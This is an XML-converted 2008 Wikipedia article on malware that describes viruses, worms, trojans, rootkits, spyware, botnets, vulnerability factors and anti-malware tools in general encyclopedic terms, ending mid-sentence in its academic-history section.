<?xml version="1.0" encoding="UTF-8"?>
<!-- generated by CLiX/Wiki2XML [MPI-Inf, MMCI@UdS] $LastChangedRevision: 92 $ on 16.04.2009 15:30:28[mciao0827] -->
<!DOCTYPE article SYSTEM "../article.dtd">
<article xmlns:xlink="http://www.w3.org/1999/xlink">
<header>
<title>Malware</title>
<id>20901</id>
<revision>
<id>244598563</id>
<timestamp>2008-10-11T17:09:02Z</timestamp>
<contributor>
<username>Frankenpuppy</username>
<id>7998399</id>
</contributor>
</revision>
<categories>
<category>Malware</category>
</categories>
</header>
<bdy>

<image location="right" width="150px" src="Benedelman-spyware-blogspot-2a.png" type="thumb">
<caption>

A screenshot of a malicious website attempting to install <link xlink:type="simple" xlink:href="../951/28951.xml">
spyware</link> via an <link xlink:type="simple" xlink:href="../497/93497.xml">
ActiveX</link> Control in <software wordnetid="106566077" confidence="0.8">
<idea wordnetid="105833840" confidence="0.8">
<concept wordnetid="105835747" confidence="0.8">
<application wordnetid="106570110" confidence="0.8">
<component wordnetid="105868954" confidence="0.8">
<program wordnetid="106568978" confidence="0.8">
<browser wordnetid="106571301" confidence="0.8">
<written_communication wordnetid="106349220" confidence="0.8">
<writing wordnetid="106359877" confidence="0.8">
<code wordnetid="106355894" confidence="0.8">
<part wordnetid="105867413" confidence="0.8">
<coding_system wordnetid="106353757" confidence="0.8">
<link xlink:type="simple" xlink:href="../387/1956387.xml">
Internet Explorer 6</link></coding_system>
</part>
</code>
</writing>
</written_communication>
</browser>
</program>
</component>
</application>
</concept>
</idea>
</software>
 
</caption>
</image>
<p>

<b>Malware</b>, a <link xlink:type="simple" xlink:href="../212/16823212.xml">
portmanteau word</link> from the words <link xlink:type="simple" xlink:href="../052/2216052.xml">
<b>mal</b>icious</link> and <link xlink:type="simple" xlink:href="../309/5309.xml">
soft<b>ware</b></link>,  is software designed to infiltrate or damage a computer system without the owner's <link xlink:type="simple" xlink:href="../355/50355.xml">
informed consent</link>. The expression is a general term used by computer professionals to mean a variety of forms of hostile, intrusive, or annoying software or program code.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%221%22])">1</ref></p>
<p>

Many computer users are unfamiliar with the term, and often use "<link xlink:type="simple" xlink:href="../196/18994196.xml">
computer virus</link>" for all types of malware, including true viruses. </p>
<p>

Software is considered malware based on the perceived intent of the creator rather than any particular features. Malware includes <link xlink:type="simple" xlink:href="../196/18994196.xml">
computer viruses</link>, <link xlink:type="simple" xlink:href="../010/6010.xml">
worms</link>, <link xlink:type="simple" xlink:href="../056/30056.xml">
trojan horse</link>s, most <link xlink:type="simple" xlink:href="../942/223942.xml">
rootkit</link>s, <link xlink:type="simple" xlink:href="../951/28951.xml">
spyware</link>, dishonest <link xlink:type="simple" xlink:href="../616/2616.xml">
adware</link>, <link xlink:type="simple" xlink:href="../229/2148229.xml">
crimeware</link> and other malicious and unwanted software. In <link xlink:type="simple" xlink:href="../668/18949668.xml">
law</link>, malware is sometimes known as a <b>computer contaminant</b>, for instance in the legal codes of several American states, including <country wordnetid="108544813" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../407/5407.xml">
California</link></country>
 and <region wordnetid="108630985" confidence="0.8">
<administrative_district wordnetid="108491826" confidence="0.8">
<location wordnetid="100027167" confidence="0.8">
<district wordnetid="108552138" confidence="0.8">
<country wordnetid="108544813" confidence="0.8">
<link xlink:type="simple" xlink:href="../905/32905.xml">
West Virginia</link></country>
</district>
</location>
</administrative_district>
</region>
.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%222%22])">2</ref> <ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%223%22])">3</ref></p>
<p>

Malware is not the same as defective software, that is, software which has a legitimate purpose but contains harmful <invertebrate wordnetid="101905661" confidence="0.8">
<arthropod wordnetid="101767661" confidence="0.8">
<bug wordnetid="102236355" confidence="0.8">
<insect wordnetid="102159955" confidence="0.8">
<animal wordnetid="100015388" confidence="0.8">
<link xlink:type="simple" xlink:href="../085/37085.xml">
bugs</link></animal>
</insect>
</bug>
</arthropod>
</invertebrate>
.</p>
<p>

Preliminary results from <company wordnetid="108058098" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../414/354414.xml">
Symantec</link></company>
 sensors published in 2008 suggested that "the release rate of malicious code and other unwanted programs may be exceeding that of legitimate software applications."<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%224%22])">4</ref> According to <company wordnetid="108058098" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../998/1107998.xml">
F-Secure</link></company>
, "As much malware [was] produced in 2007 as in the previous 20 years altogether."<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%225%22])">5</ref> Malware's most common pathway from criminals to users is through the <link xlink:type="simple" xlink:href="../539/14539.xml">
Internet</link>, by email and the <invention wordnetid="105633385" confidence="0.8">
<link xlink:type="simple" xlink:href="../139/33139.xml">
World Wide Web</link></invention>
.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%226%22])">6</ref></p>

<sec>
<st>
Purposes</st>
<p>

Many early infectious programs, including the first <link xlink:type="simple" xlink:href="../521/53521.xml">
Internet Worm</link> and a number of <O wordnetid="106832680" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../027/20027.xml">
MS-DOS</link></O>
 viruses, were written as experiments or pranks generally intended to be harmless or merely annoying rather than to cause serious damage to computers. In some cases the perpetrator did not realize how much harm their creations could do. Young <link xlink:type="simple" xlink:href="../716/23716.xml">
programmer</link>s learning about viruses and the techniques used to write them only to prove that they could or to see how far it could spread. As late as 1999, widespread viruses such as the <link xlink:type="simple" xlink:href="../605/175605.xml">
Melissa virus</link> appear to have been written chiefly as pranks. </p>
<p>

Hostile intent related to <link xlink:type="simple" xlink:href="../676/32676.xml">
vandalism</link> can be found in programs designed to cause harm or data loss. Many DOS viruses, and the <link xlink:type="simple" xlink:href="../890/18890.xml">
Windows</link> <worm wordnetid="101922303" confidence="0.8">
<invertebrate wordnetid="101905661" confidence="0.8">
<animal wordnetid="100015388" confidence="0.8">
<link xlink:type="simple" xlink:href="../232/7965232.xml">
ExploreZip</link></animal>
</invertebrate>
</worm>
 worm, were designed to destroy files on a <link xlink:type="simple" xlink:href="../777/13777.xml">
hard disk</link>, or to corrupt the file system by writing junk data. Network-borne worms such as the 2001 <link xlink:type="simple" xlink:href="../722/174722.xml">
Code Red worm</link> or the Ramen worm fall into the same category. Designed to vandalize web pages, these worms may seem like the online equivalent to <link xlink:type="simple" xlink:href="../985/11985.xml">
graffiti</link> tagging, with the author's alias or affinity group appearing everywhere the worm goes.</p>
<p>

However, since the rise of widespread <link xlink:type="simple" xlink:href="../184/147184.xml">
broadband</link> <link xlink:type="simple" xlink:href="../539/14539.xml">
Internet</link> access, malicious software has come to be designed for a profit motive, either more or less legal (forced advertising) or criminal. For instance, since 2003, the majority of widespread viruses and worms have been designed to take control of users' computers for black-market exploitation.  Infected "<link xlink:type="simple" xlink:href="../566/531566.xml">
zombie computer</link>s" are used to send <link xlink:type="simple" xlink:href="../847/459847.xml">
email spam</link>, to host contraband data such as <link xlink:type="simple" xlink:href="../954/19596954.xml">
child pornography</link><ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%227%22])">7</ref>, or to engage in <link>
distributed denial-of-service</link> attacks as a form of <link xlink:type="simple" xlink:href="../449/162449.xml">
extortion</link>.</p>
<p>

Another strictly for-profit category of malware has emerged in <link xlink:type="simple" xlink:href="../951/28951.xml">
spyware</link> -- programs designed to monitor users' web browsing, display unsolicited advertisements, or redirect <link xlink:type="simple" xlink:href="../758/703758.xml">
affiliate marketing</link> revenues to the spyware creator. Spyware programs do not spread like viruses; they are generally installed by exploiting security holes or are packaged with user-installed software, such as peer-to-peer applications. It is not uncommon for spyware and advertising programs to install so many processes that the infected machine becomes unusable, defeating the intention of the attack.</p>

</sec>
<sec>
<st>
Infectious malware: viruses and worms</st>

<p>

<indent level="1">

<it>Main articles: <link xlink:type="simple" xlink:href="../196/18994196.xml">
Computer virus</link>&#32;and&#32;<link xlink:type="simple" xlink:href="../010/6010.xml">
Computer worm</link></it>
</indent>

The best-known types of malware, <it>viruses</it> and <it>worms</it>, are known for the manner in which they spread, rather than any other particular behavior. The term <it><link xlink:type="simple" xlink:href="../196/18994196.xml">
computer virus</link></it> is used for a program which has infected some executable software and which causes that software, <it>when run</it>, to spread the virus to other executable software. Viruses may also contain a <link xlink:type="simple" xlink:href="../666/15160666.xml">
payload</link> which performs other actions, often malicious. A <it><link xlink:type="simple" xlink:href="../010/6010.xml">
worm</link></it>, on the other hand, is a program which actively transmits itself over a network to infect other computers. It too may carry a payload. </p>
<p>

These definitions lead to the observation that a virus requires user intervention to spread, whereas a worm spreads automatically. Using this distinction, infections transmitted by <link xlink:type="simple" xlink:href="../738/9738.xml">
email</link> or <software wordnetid="106566077" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../287/20287.xml">
Microsoft Word</link></software>
 documents, which rely on the recipient opening a file or email to infect the system, would be classified as viruses rather than worms. </p>
<p>

Some writers in the trade and popular press appear to misunderstand this distinction, and use the terms interchangeably.</p>

<ss1>
<st>
Capsule history of viruses and worms</st>

<p>

Before <link xlink:type="simple" xlink:href="../539/14539.xml">
Internet</link> access became widespread, viruses spread on personal computers by infecting programs or the executable <link xlink:type="simple" xlink:href="../381/216381.xml">
boot sector</link>s of floppy disks. By inserting a copy of itself into the <link xlink:type="simple" xlink:href="../683/20683.xml">
machine code</link> instructions in these executables, a virus causes itself to be run whenever the program is run or the disk is booted. Early computer viruses were written for the <link xlink:type="simple" xlink:href="../ury/22nd_century.xml">
Apple II</link> and <link xlink:type="simple" xlink:href="../979/19006979.xml">
Macintosh</link>, but they became more widespread with the dominance of the <link xlink:type="simple" xlink:href="../032/15032.xml">
IBM PC</link> and <O wordnetid="106832680" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../027/20027.xml">
MS-DOS</link></O>
 system. Executable-infecting viruses are dependent on users exchanging software or boot floppies, so they spread heavily in computer hobbyist circles.</p>
<p>

The first worms, network-borne infectious programs, originated not on personal computers, but on multitasking <family wordnetid="108078020" confidence="0.8">
<link xlink:type="simple" xlink:href="../642/31642.xml">
Unix</link></family>
 systems. The first well-known worm was the <link xlink:type="simple" xlink:href="../521/53521.xml">
Internet Worm</link> of 1988, which infected <O wordnetid="106832680" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../071/29071.xml">
SunOS</link></O>
 and <link xlink:type="simple" xlink:href="../517/32517.xml">
VAX</link> <link xlink:type="simple" xlink:href="../807/1223807.xml">
BSD</link> systems. Unlike a virus, this worm did not insert itself into other programs. Instead, it exploited security holes in network server programs and started itself running as a separate process. This same behavior is used by today's worms as well.</p>
<p>

With the rise of the <link xlink:type="simple" xlink:href="../890/18890.xml">
Microsoft Windows</link> platform in the 1990s, and the flexible <idea wordnetid="105833840" confidence="0.8">
<concept wordnetid="105835747" confidence="0.8">
<link xlink:type="simple" xlink:href="../560/20560.xml">
macro</link></concept>
</idea>
 systems of its applications, it became possible to write infectious code in the macro language of <link xlink:type="simple" xlink:href="../287/20287.xml">
Microsoft Word</link> and similar programs. These <it><link xlink:type="simple" xlink:href="../934/20934.xml">
macro virus</link>es</it> infect documents and templates rather than applications, but rely on the fact that macros in a Word document are a form of executable code.</p>
<p>

Today, worms are most commonly written for the Windows OS, although a small number are also written for <O wordnetid="106832680" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../297/6097297.xml">
Linux</link></O>
 and <family wordnetid="108078020" confidence="0.8">
<link xlink:type="simple" xlink:href="../642/31642.xml">
Unix</link></family>
 systems. Worms today work in the same basic way as 1988's Internet Worm: they scan the network for computers with vulnerable network services, break in to those computers, and copy themselves over. Worm outbreaks have become a cyclical plague for both home users and businesses, eclipsed recently in terms of damage by <link xlink:type="simple" xlink:href="../951/28951.xml">
spyware</link>.</p>

</ss1>
</sec>
<sec>
<st>
Concealment: Trojan horses, rootkits, and backdoors</st>

<p>

<indent level="1">

<it>Main articles: <link xlink:type="simple" xlink:href="../056/30056.xml">
Trojan horse (computing)</link>,&#32;<link xlink:type="simple" xlink:href="../942/223942.xml">
Rootkit</link>,&#32;and&#32;<technique wordnetid="105665146" confidence="0.8">
<know-how wordnetid="105616786" confidence="0.8">
<method wordnetid="105660268" confidence="0.8">
<link xlink:type="simple" xlink:href="../788/360788.xml">
Backdoor (computing)</link></method>
</know-how>
</technique>
</it>
</indent>

</p>
<ss1>
<st>
Trojan Horses</st>
<p>

For a malicious program to accomplish its goals, it must be able to do so without being shut down, or deleted by the user or administrator of the computer it's running on. Concealment can also help get the malware installed in the first place. When a malicious program is disguised as something innocuous or desirable, users may be tempted to install it without knowing what it does. This is the technique of the <it><link xlink:type="simple" xlink:href="../056/30056.xml">
Trojan horse</link></it> or <it>trojan</it>. </p>
<p>

Broadly speaking, a Trojan horse is any program that invites the user to run it, but conceals a harmful or malicious payload. The payload may take effect immediately and can lead to many undesirable effects, such as deleting all the user's files, or more commonly it may install further harmful software into the user's system to serve the creator's longer-term goals. Trojan horses known as <link xlink:type="simple" xlink:href="../440/1149440.xml">
dropper</link>s are used to start off a worm outbreak, by injecting the worm into users' local networks.</p>
<p>

One of the most common ways that spyware is distributed is as a Trojan horse, bundled with a piece of desirable software that the user downloads from the Internet. When the user installs the software, the spyware is installed alongside. Spyware authors who attempt to act in a legal fashion may include an <link xlink:type="simple" xlink:href="../764/49764.xml">
end-user license agreement</link> which states the behavior of the spyware in loose terms, and which the users are unlikely to read or understand.</p>

</ss1>
<ss1>
<st>
Rootkits</st>
<p>

Once a malicious program is installed on a system, it is often useful to the creator if it <it>stays</it> concealed. The same is true when a human attacker breaks into a computer directly. Techniques known as <it><link xlink:type="simple" xlink:href="../942/223942.xml">
rootkit</link>s</it> allow this concealment, by modifying the host operating system so that the malware is hidden from the user. Rootkits can prevent a malicious <link xlink:type="simple" xlink:href="../178/45178.xml">
process</link> from being visible in the system's list of processes, or keep its files from being read. Originally, a rootkit was a set of tools installed by a human attacker on a Unix system where the attacker had gained administrator (root) access. Today, the term is used more generally for concealment routines in a malicious program.</p>
<p>

Some malicious programs contain routines to defend against removal: not merely to hide themselves, but to repel attempts to remove them. An early example of this behavior is recorded in the <work wordnetid="104599396" confidence="0.8">
<product wordnetid="104007894" confidence="0.8">
<creation wordnetid="103129123" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<oeuvre wordnetid="103841417" confidence="0.8">
<book wordnetid="106410904" confidence="0.8">
<end_product wordnetid="103287178" confidence="0.8">
<publication wordnetid="106589574" confidence="0.8">
<link xlink:type="simple" xlink:href="../054/16054.xml">
Jargon File</link></publication>
</end_product>
</book>
</oeuvre>
</artifact>
</creation>
</product>
</work>
 tale of a pair of programs infesting a Xerox <link>
CP-V</link> timesharing system:</p>
<p>

<indent level="1">

Each ghost-job would detect the fact that the other had been killed, and would start a new copy of the recently slain program within a few milliseconds. The only way to kill both ghosts was to kill them simultaneously (very difficult) or to deliberately crash the system. <weblink xlink:type="simple" xlink:href="http://catb.org/jargon/html/meaning-of-hack.html">
http://catb.org/jargon/html/meaning-of-hack.html</weblink>
</indent>

Similar techniques are used by some modern malware, wherein the malware starts a number of processes which monitor one another and restart any process which is killed off by the operator.</p>

</ss1>
<ss1>
<st>
Backdoors</st>
<p>

A <technique wordnetid="105665146" confidence="0.8">
<know-how wordnetid="105616786" confidence="0.8">
<method wordnetid="105660268" confidence="0.8">
<link xlink:type="simple" xlink:href="../788/360788.xml">
backdoor</link></method>
</know-how>
</technique>
 is a method of bypassing normal <link xlink:type="simple" xlink:href="../967/47967.xml">
authentication</link> procedures. Once a system has been compromised (by one of the above methods, or in some other way), one or more backdoors may be installed, in order to allow the attacker access in the future. The idea has often been suggested that computer manufacturers preinstall backdoors on their systems to provide technical support for customers, but this has never been reliably verified. <link xlink:type="simple" xlink:href="../213/29213.xml">
Crackers</link> typically use backdoors to secure remote access to a computer, while attempting to remain hidden from casual inspection. To install backdoors <link xlink:type="simple" xlink:href="../213/29213.xml">
crackers</link> may use <link xlink:type="simple" xlink:href="../056/30056.xml">
Trojan horses</link>, <link xlink:type="simple" xlink:href="../010/6010.xml">
worms</link>, or other methods.</p>

</ss1>
</sec>
<sec>
<st>
Malware for profit: spyware, botnets, keystroke loggers, and dialers</st>

<p>

<indent level="1">

<it>Main articles: <link xlink:type="simple" xlink:href="../951/28951.xml">
Spyware</link>,&#32;<system wordnetid="104377057" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<link xlink:type="simple" xlink:href="../268/636268.xml">
Botnet</link></instrumentality>
</artifact>
</system>
,&#32;<operation wordnetid="100955060" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<attack wordnetid="100972621" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<activity wordnetid="100407535" confidence="0.8">
<link xlink:type="simple" xlink:href="../829/57829.xml">
Keystroke logging</link></activity>
</psychological_feature>
</act>
</attack>
</event>
</operation>
,&#32;and&#32;<link xlink:type="simple" xlink:href="../271/375271.xml#xpointer(//*[./st=%22Fraudulent+dialers%22])">
Dialer#Fraudulent dialers</link></it>
</indent>

During the 1980s and 1990s, it was usually taken for granted that malicious programs were created as a form of <link xlink:type="simple" xlink:href="../676/32676.xml">
vandalism</link> or <link xlink:type="simple" xlink:href="../090/93090.xml">
prank</link> (although some viruses were spread only to discourage users from illegal software exchange.) More recently, the greater share of malware programs have been written with a financial or profit motive in mind. This can be taken as the malware authors' choice to monetize their control over infected systems: to turn that control into a source of revenue.</p>
<p>

Since 2003 or so, the most costly form of malware in terms of time and money spent in recovery has been the broad category known as <it><link xlink:type="simple" xlink:href="../951/28951.xml">
spyware</link></it>.  Spyware programs are commercially produced for the purpose of gathering information about computer users, showing them <link xlink:type="simple" xlink:href="../320/466320.xml">
pop-up ad</link>s, or altering web-browser behavior for the financial benefit of the spyware creator. For instance, some spyware programs redirect <artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<engine wordnetid="103287733" confidence="0.8">
<motor wordnetid="103789946" confidence="0.8">
<device wordnetid="103183080" confidence="0.8">
<machine wordnetid="103699975" confidence="0.8">
<link xlink:type="simple" xlink:href="../023/4059023.xml">
search engine</link></machine>
</device>
</motor>
</engine>
</instrumentality>
</artifact>
 results to paid advertisements. Others, often called "<link xlink:type="simple" xlink:href="../100/1475100.xml">
stealware</link>" by the media, overwrite <link xlink:type="simple" xlink:href="../758/703758.xml">
affiliate marketing</link> codes so that revenue goes to the spyware creator rather than the intended recipient.</p>
<p>

Spyware programs are sometimes installed as Trojan horses of one sort or another. They differ in that their creators present themselves openly as businesses, for instance by selling advertising space on the pop-ups created by the malware. Most such programs present the user with an <link xlink:type="simple" xlink:href="../764/49764.xml">
end-user license agreement</link> which purportedly protects the creator from prosecution under computer contaminant laws. However, spyware EULAs have not yet been upheld in court.</p>
<p>

Another way that financially-motivated malware creators can profit from their infections is to directly use the infected computers to do work for the creator. <it>Spammer viruses</it>, such as the <link xlink:type="simple" xlink:href="../676/313676.xml">
Sobig</link> and <link xlink:type="simple" xlink:href="../477/444477.xml">
Mydoom</link> virus families, are commissioned by <link xlink:type="simple" xlink:href="../847/459847.xml">
e-mail spam</link> gangs. The infected computers are used as <link xlink:type="simple" xlink:href="../273/769273.xml">
proxies</link> to send out spam messages. The advantage to spammers of using infected computers is that they are available in large supply (thanks to the virus) and they provide anonymity, protecting the spammer from prosecution. Spammers have also used infected PCs to target anti-spam organizations with <link>
distributed denial-of-service attack</link>s.</p>
<p>

In order to coordinate the activity of many infected computers, attackers have used coordinating systems known as <it><link xlink:type="simple" xlink:href="../268/636268.xml">
botnet</link>s</it>. In a botnet, the malware or <link xlink:type="simple" xlink:href="../607/1569607.xml">
malbot</link> logs in to an <social_group wordnetid="107950920" confidence="0.8">
<gathering wordnetid="107975026" confidence="0.8">
<community wordnetid="108223802" confidence="0.8">
<group wordnetid="100031264" confidence="0.8">
<link xlink:type="simple" xlink:href="../730/14730.xml">
Internet Relay Chat</link></group>
</community>
</gathering>
</social_group>
 channel or other chat system. The attacker can then give instructions to all the infected systems simultaneously. Botnets can also be used to push upgraded malware to the infected systems, keeping them resistant to anti-virus software or other security measures.</p>
<p>

Lastly, it is possible for a malware creator to profit by simply stealing from the person whose computer is infected. Some malware programs install a <it><operation wordnetid="100955060" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<attack wordnetid="100972621" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<activity wordnetid="100407535" confidence="0.8">
<link xlink:type="simple" xlink:href="../829/57829.xml">
key logger</link></activity>
</psychological_feature>
</act>
</attack>
</event>
</operation>
</it>, which copies down the user's keystrokes when entering a password, credit card number, or other information that may be useful to the creator. This is then transmitted to the malware creator automatically, enabling <link xlink:type="simple" xlink:href="../419/15905419.xml">
credit card fraud</link> and other theft. Similarly, malware may copy the <link xlink:type="simple" xlink:href="../661/386661.xml">
CD key</link> or password for online games, allowing the creator to steal accounts or virtual items.</p>
<p>

Another way of stealing money from the infected PC owner is to take control of the <link xlink:type="simple" xlink:href="../900/19443900.xml">
modem</link> and dial an expensive toll call. <it><link xlink:type="simple" xlink:href="../271/375271.xml">
Dialer</link></it> (or <it>porn dialer</it>) software dials up a <link xlink:type="simple" xlink:href="../014/252014.xml">
premium-rate telephone number</link> such as a U.S. "900 number" and leave the line open, charging the toll to the infected user.</p>

</sec>
<sec>
<st>
Vulnerability to malware</st>

<p>

<indent level="1">

<it>Main article: <accomplishment wordnetid="100035189" confidence="0.8">
<event wordnetid="100029378" confidence="0.8">
<action wordnetid="100037396" confidence="0.8">
<act wordnetid="100030358" confidence="0.8">
<psychological_feature wordnetid="100023100" confidence="0.8">
<feat wordnetid="100036762" confidence="0.8">
<link xlink:type="simple" xlink:href="../827/1129827.xml">
Vulnerability (computing)</link></feat>
</psychological_feature>
</act>
</action>
</event>
</accomplishment>
</it>
</indent>

In this context, as throughout, it should be borne in mind that the “system” under attack may be of various types, e.g. a single computer and operating system, a network or an application.</p>
<p>

Various factors make a system more vulnerable to malware:
<list>
<entry level="1" type="bullet">

<b>Homogeneity</b> &ndash; e.g. when all computers in a network run the same OS, if you can hack that OS, you can break into any computer running it.</entry>
<entry level="1" type="bullet">

<b>Defects</b> &ndash; most systems containing errors which may be exploited by malware.</entry>
<entry level="1" type="bullet">

<b>Unconfirmed code</b> &ndash; code from a <link xlink:type="simple" xlink:href="../891/10891.xml">
floppy disk</link>, <recording wordnetid="104063868" confidence="0.8">
<artifact wordnetid="100021939" confidence="0.8">
<instrumentality wordnetid="103575240" confidence="0.8">
<sound_recording wordnetid="104262678" confidence="0.8">
<memory_device wordnetid="103744840" confidence="0.8">
<device wordnetid="103183080" confidence="0.8">
<phonograph_record wordnetid="103924069" confidence="0.8">
<medium wordnetid="106254669" confidence="0.8">
<link xlink:type="simple" xlink:href="../902/18959902.xml">
CD-ROM</link></medium>
</phonograph_record>
</device>
</memory_device>
</sound_recording>
</instrumentality>
</artifact>
</recording>
 or <link>
USB</link> device may be executed without the user’s agreement.</entry>
<entry level="1" type="bullet">

<b>Over-privileged users</b> &ndash; some systems allow all users to modify their internal structures.</entry>
<entry level="1" type="bullet">

<b>Over-privileged code</b> &ndash; most popular systems allow code executed by a user all rights of that user.</entry>
</list>
</p>
<p>

An often cited cause of vulnerability of networks is <b>homogeneity</b> or software monoculture. In particular, Microsoft Windows has such a large share of the market that concentrating on it will enable a cracker to subvert a large number of systems. Introducing inhomogeneity purely for the sake of robustness would however bring high costs in terms of training and maintenance.</p>
<p>

Most systems contain <b>bugs</b> which may be exploited by malware. A typical example is the <link>
buffer overrun</link>, in which an interface designed to store data in a small area of memory allows the caller to supply more data than will fit. This extra data then overwrites the interface's own structure. In this way malware can force the system to execute malicious code, by replacing legitimate code with its own payload.</p>
<p>

Originally, PCs had to be booted from floppy disks, and until recently it was common for this to be the default boot device. This meant that a corrupt floppy disk could subvert the computer during booting, and the same applies to CDs. Although that is now less common, it is still possible to forget that one has changed the default, and rare that a <generic wordnetid="107899976" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../473/Form_4473.xml">
BIOS</link></generic>
 makes one <b>confirm</b> a boot from removable media.</p>
<p>

In some systems, non-administrator <b>users are over-privileged</b> by design, in the sense that they are allowed to modify internal structures of the system. In some environments, users are over-privileged because they have been inappropriately granted administrator or equivalent status. This is a primarily a configuration decision, but on Microsoft Windows systems the default configuration is to over-privilege the user. This situation exists due to decisions made by Microsoft to prioritize compatibility with older systems above security configuration in newer systems and because typical applications were developed without the under-privileged users in mind. As privilege escalation exploits have increased this priority is shifting for the release of Microsoft Windows Vista. As a result, many existing applications that require excess privilege (over-privileged code) may have compatibility problems with Vista. However, Vista's User Account Control feature attempts to remedy applications not designed for under-privileged users through virtualization, acting as a crutch to resolve the privileged access problem inherent in legacy applications.</p>
<p>

Malware, running as over-privileged code, can use this privilege to subvert the system. Almost all currently popular operating systems, and also many scripting applications allow <b>code too many privileges</b>, usually in the sense that when a user executes code, the system allows that code all rights of that user. This makes users vulnerable to malware in the form of <link xlink:type="simple" xlink:href="../752/865752.xml">
e-mail attachment</link>s, which may or may not be disguised.</p>

<p>

Given this state of affairs, users are warned only to open attachments they trust, and to be wary of code received from untrusted sources. It is also common for operating systems to be designed so that <link xlink:type="simple" xlink:href="../101/9101.xml">
device driver</link>s need escalated privileges, while they are supplied by more and more hardware manufacturers, some of whom may be unreliable.</p>

<ss1>
<st>
Eliminating over-privileged code</st>
<p>

Over-privileged code dates from the time when most programs were either delivered with a computer or written in-house, and repairing it would at a stroke render most anti-virus software almost redundant. It would, however, have appreciable consequences for the user interface and system management.</p>
<p>

The system would have to maintain privilege profiles, and know which to apply for each user and program.
In the case of newly installed software, an administrator would need to set up default profiles for the new code.</p>
<p>

Eliminating vulnerability to rogue <link xlink:type="simple" xlink:href="../101/9101.xml">
device drivers</link> is probably harder than for arbitrary rogue executables. Two techniques, used in <O wordnetid="106832680" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../736/32736.xml">
VMS</link></O>
, that can help are memory mapping only the registers of the device in question and a system interface associating the driver with interrupts from the device.</p>
<p>

Other approaches are:
<list>
<entry level="1" type="bullet">

Various forms of <link xlink:type="simple" xlink:href="../356/18311356.xml">
virtualization</link>, allowing the code unlimited access only to virtual resources</entry>
<entry level="1" type="bullet">

Various forms of <link xlink:type="simple" xlink:href="../932/1291932.xml">
sandbox</link> or <link xlink:type="simple" xlink:href="../340/2770340.xml">
jail</link></entry>
<entry level="1" type="bullet">

The security functions of <message wordnetid="106598915" confidence="0.8">
<request wordnetid="106513366" confidence="0.8">
<link xlink:type="simple" xlink:href="../881/15881.xml">
Java</link></request>
</message>
, in java.security</entry>
</list>
</p>
<p>

Such approaches, however, if not fully integrated with the operating system, would reduplicate effort and not be universally applied, both of which would be detrimental to security.</p>

</ss1>
</sec>
<sec>
<st>
Anti-Malware Programs</st>
<p>

As malware attacks become more frequent, attention has begun to shift from viruses and spyware protection, to malware protection, and programs have been developed to specifically combat them.  Lavasoft's <it><link xlink:type="simple" xlink:href="../489/713489.xml">
Ad-Aware SE</link></it> is an example of a freeware program originally created to combat spyware and adware, but which also protects against some malware, viruses, and worms. <it><link xlink:type="simple" xlink:href="../466/19476466.xml">
Malwarebytes' Anti-Malware</link></it> is a shareware more focused on trojans, browser hijackers, and other malware, and which consequently roots out many kinds of malware that most other defensive programs won't find.</p>
<p>

Anti-malware programs can combat malware in two ways:
<list>
<entry level="1" type="bullet">

1. They can provide real time protection against the installation of malware software on your computer. This type of spyware protection works the same way as that of anti-virus protection in that the anti-malware software scans all incoming network data for malware software and blocks any threats it comes across.</entry>
<entry level="1" type="bullet">

2. Anti-malware software programs can be used solely for detection and removal of malware software that has already been installed onto your computer. This type of malware protection is normally much easier to use and more popular. This type of anti-malware software scans the contents of the windows registry, operating system files, and installed programs on your computer and will provide a list of any threats found, allowing you to choose what you want to delete and what you want to keep, or compare this list to a list of known malware components, removing files which match.</entry>
</list>
</p>
<p>

Real-time protection from malware works identically to real-time anti-virus protection: the software scans disk files at download time, and blocks the activity of components known to represent malware. In some cases, it may also intercept attempts to install start-up items or to modify browser settings. Because many malware components are installed as a result of browser exploits or user error, using security software (some of which are anti-malware, though many are not) to "sandbox" browsers (essentially babysit the user and their browser) can also be effective to help restrict any damage done.</p>

</sec>
<sec>
<st>
Academic research on malware: a brief overview</st>
<p>

The notion of a self-reproducing computer program can be traced back to 1949 when <person wordnetid="100007846" confidence="0.9508927676800064">
<scientist wordnetid="110560637" confidence="0.9508927676800064">
<link xlink:type="simple" xlink:href="../942/15942.xml">
John von Neumann</link></scientist>
</person>
 presented lectures that encompassed the theory and organization of complicated automata.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%228%22])">8</ref> Neumann showed that in theory a program could reproduce itself. This constituted a plausibility result in <link xlink:type="simple" xlink:href="../136/442136.xml">
computability theory</link>. Fred Cohen experimented with computer viruses and confirmed Neumann's postulate. He also investigated other properties of malware (detectability, self-obfuscating programs that used rudimentary encryption that he called "evolutionary", and so on). His doctoral dissertation was on the subject of computer viruses.<ref xlink:type="simple" xlink:href="#xpointer(//reflist/entry[@id=%229%22])">9</ref> Cohen's faculty advisor, Leonard Adleman (the A in <link xlink:type="simple" xlink:href="../385/25385.xml">
